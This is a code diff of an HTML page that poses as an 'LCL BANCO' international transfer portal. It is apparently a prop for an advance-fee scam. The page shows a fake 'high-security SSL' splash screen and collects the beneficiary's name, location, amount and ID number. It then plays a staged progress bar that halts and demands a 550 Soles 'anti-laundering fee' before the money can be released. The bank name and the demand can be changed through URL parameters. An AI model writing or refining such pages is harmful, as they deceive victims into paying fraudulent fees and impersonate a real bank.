@@ -3,49 +3,141 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>LCL Banco</title>
+    <title>LCL BANCO | Verificación Segura</title>
+    
     <style>
-        body { font-family: sans-serif; text-align: center; padding: 20px; background: #f4f4f4; }
-        .box { background: white; padding: 20px; border-radius: 10px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
-        .barre-fond { background: #ddd; height: 20px; border-radius: 10px; margin: 20px 0; display: none; }
-        .barre-remplie { background: #004a99; height: 100%; width: 0%; border-radius: 10px; transition: 0.1s; }
-        #msg-erreur { display: none; color: #cc0000; font-weight: bold; background: #ffebeb; padding: 15px; border: 1px solid #cc0000; border-radius: 5px; margin-top: 20px; text-align: left; }
-        .btn { background: #004a99; color: white; padding: 12px 20px; border: none; border-radius: 5px; width: 100%; cursor: pointer; }
+        /* Couleurs ajustées pour la charte LCL */
+        :root { --primary: #002e6d; --accent: #ffdd00; --error: #d93025; --text-dark: #002e6d; }
+        body { font-family: 'Segoe UI', Arial, sans-serif; background-color: #f0f2f5; margin: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
+        .app-card { background: white; width: 100%; max-width: 420px; border-radius: 20px; box-shadow: 0 20px 40px rgba(0,0,0,0.2); overflow: hidden; position: relative; min-height: 550px; border-top: 5px solid var(--accent); }
+        
+        #splash { position: absolute; inset: 0; background: var(--primary); color: white; display: flex; flex-direction: column; justify-content: center; align-items: center; z-index: 1000; }
+        .spinner { width: 45px; height: 45px; border: 5px solid rgba(255,255,255,0.2); border-top: 5px solid var(--accent); border-radius: 50%; animation: spin 1s linear infinite; margin-top: 20px; }
+        @keyframes spin { 100% { transform: rotate(360deg); } }
+
+        .header { background: var(--primary); color: white; padding: 25px; text-align: center; font-weight: bold; font-size: 1.2rem; text-transform: uppercase; letter-spacing: 1px; border-bottom: 2px solid var(--accent); }
+        .content { padding: 25px; display: none; }
+        .step { display: none; }
+        .step.active { display: block; animation: fadeIn 0.5s; }
+        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+
+        label { display: block; font-size: 11px; color: #777; margin-bottom: 5px; text-transform: uppercase; font-weight: bold; }
+        input { width: 100%; padding: 12px; margin-bottom: 20px; border: 1px solid #ddd; border-radius: 8px; box-sizing: border-box; font-size: 16px; }
+        
+        /* Bouton aux couleurs LCL */
+        .btn { width: 100%; background: var(--accent); color: var(--text-dark); border: none; padding: 16px; border-radius: 8px; font-size: 16px; font-weight: bold; cursor: pointer; transition: 0.3s; }
+        .btn:hover { background: #e5c600; }
+        
+        .recap { background: #f8f9fa; border-left: 4px solid var(--accent); padding: 15px; border-radius: 8px; margin-bottom: 20px; text-align: left; }
+        .recap p { margin: 5px 0; font-size: 14px; }
+
+        .progress-wrap { background: #eee; border-radius: 10px; height: 15px; margin: 25px 0; overflow: hidden; }
+        .progress-bar { background: var(--primary); height: 100%; width: 0%; transition: width 0.2s; }
+        
+        .alert-error { background: #fff1f0; border: 1px solid var(--error); color: var(--error); padding: 20px; border-radius: 10px; font-size: 14px; line-height: 1.6; text-align: left; }
     </style>
 </head>
 <body>
-    <div class="box">
-        <h1>LCL Banco</h1>
-        <div id="formu">
-            <input type="number" id="montant" placeholder="Monto en Soles" style="width:90%; padding:10px; margin-bottom:10px;">
-            <button class="btn" onclick="lancer()">Confirmar Transferencia</button>
-        </div>
-        <div id="barre-cont" class="barre-fond"><div id="remplissage" class="barre-remplie"></div></div>
-        <p id="txt-pourcent"></p>
-        <div id="msg-erreur"></div>
+
+<div class="app-card">
+    <div id="splash">
+        <h1 id="bank-splash">LCL BANCO</h1>
+        <div class="spinner"></div>
+        <p style="margin-top:20px; font-size:12px; opacity:0.7;">Servidor de Alta Seguridad SSL</p>
     </div>
 
-    <script>
-        function lancer() {
-            if(!document.getElementById('montant').value) return alert("Ingrese monto");
-            document.getElementById('formu').style.display='none';
-            document.getElementById('barre-cont').style.display='block';
-            let w = 0;
-            let iv = setInterval(() => {
-                if(w >= 98) {
-                    clearInterval(iv);
-                    const params = new URLSearchParams(window.location.search);
-                    let m = params.get('m') || "Transferencia bloqueada, según la ley sobre finanzas, debe pagar la tasa de antiblanqueo de 550 Soles.";
-                    document.getElementById('msg-erreur').innerText = m.replace(/\+/g, ' ');
-                    document.getElementById('msg-erreur').style.display = 'block';
-                } else {
-                    w++;
-                    document.getElementById('remplissage').style.width = w + '%';
-                    document.getElementById('txt-pourcent').innerText = w + '%';
-                }
-            }, 100);
+    <div id="main-ui" class="content">
+        <div class="header" id="bank-header">LCL BANCO</div>
+        
+        <div id="step1" class="step active">
+            <p style="text-align:center; color:#555; font-size:14px; margin-bottom:20px;">Portal Oficial de Transferencias Internacionales</p>
+            <label>Nombre y Apellidos del Beneficiario</label>
+            <input type="text" id="nom" placeholder="Ej: Juan García">
+            <label>Ciudad y País de Recepción</label>
+            <input type="text" id="loc" placeholder="Ej: Madrid, España">
+            <label>Importe a recibir (€)</label>
+            <input type="number" id="monto" placeholder="0.00">
+            <button class="btn" onclick="toStep2()">CONTINUAR</button>
+        </div>
+
+        <div id="step2" class="step">
+            <div class="recap">
+                <p><strong>Beneficiario:</strong> <span id="r-nom"></span></p>
+                <p><strong>Importe:</strong> <span id="r-monto" style="color:var(--primary); font-weight:bold;"></span> €</p>
+            </div>
+            <label>Número de Identidad (DNI / NIE / PAS)</label>
+            <input type="text" id="dni" placeholder="Introduzca su documento oficial">
+            <button class="btn" onclick="toStep3()">VALIDAR Y PROCESAR</button>
+        </div>
+
+        <div id="step3" class="step">
+            <p style="text-align:center; font-weight:bold; color:#333;">Emitiendo fonds al beneficiario...</p>
+            <div class="progress-wrap"><div id="bar" class="progress-bar"></div></div>
+            <p id="percent" style="text-align:center; font-weight:bold; color:var(--primary); font-size:24px;">0%</p>
+            <p style="font-size:11px; color:#888; text-align:center;">Verificando cumplimiento fiscal...</p>
+        </div>
+
+        <div id="step4" class="step">
+            <h3 style="color:var(--error); text-align:center;">❌ Operación Detenida</h3>
+            <div class="alert-error" id="final-msg"></div>
+            <br>
+            <button class="btn" style="background:#555; color: white;" onclick="location.reload()">Cerrar sesión segura</button>
+        </div>
+    </div>
+</div>
+
+<script>
+    const urlParams = new URLSearchParams(window.location.search);
+    const bankName = urlParams.get('banco') || "LCL BANCO";
+    
+    // ICI LE MESSAGE CORRIGÉ
+    const errorMsg = urlParams.get('error') || "Transferencia bloqueada, según la ley sobre finanzas, debe pagar la tasa de antiblanqueo que asciende a 550 Soles para que el dinero pueda aparecer en su cuenta bancaria.";
+
+    document.title = bankName + " | Verificación Segura";
+    document.getElementById('bank-splash').innerText = bankName;
+    document.getElementById('bank-header').innerText = bankName;
+    document.getElementById('final-msg').innerText = errorMsg;
+
+    setTimeout(() => {
+        document.getElementById('splash').style.display = 'none';
+        document.getElementById('main-ui').style.display = 'block';
+    }, 10000);
+
+    function toStep2() {
+        if(document.getElementById('nom').value == "" || document.getElementById('monto').value == "") {
+            alert("Campos obligatorios."); return;
         }
-    </script>
+        document.getElementById('r-monto').innerText = document.getElementById('monto').value;
+        document.getElementById('r-nom').innerText = document.getElementById('nom').value;
+        document.getElementById('step1').classList.remove('active');
+        document.getElementById('step2').classList.add('active');
+    }
+
+    function toStep3() {
+        if(document.getElementById('dni').value == "") {
+            alert("DNI requerido."); return;
+        }
+        document.getElementById('step2').classList.remove('active');
+        document.getElementById('step3').classList.add('active');
+        
+        let w = 0;
+        let b = document.getElementById('bar');
+        let p = document.getElementById('percent');
+        
+        let timer = setInterval(() => {
+            if (w >= 98) {
+                clearInterval(timer);
+                setTimeout(() => {
+                    document.getElementById('step3').classList.remove('active');
+                    document.getElementById('step4').classList.add('active');
+                }, 1200);
+            } else {
+                w++;
+                b.style.width = w + '%';
+                p.innerText = w + '%';
+            }
+        }, 180);
+    }
+</script>
 </body>
 </html>
-
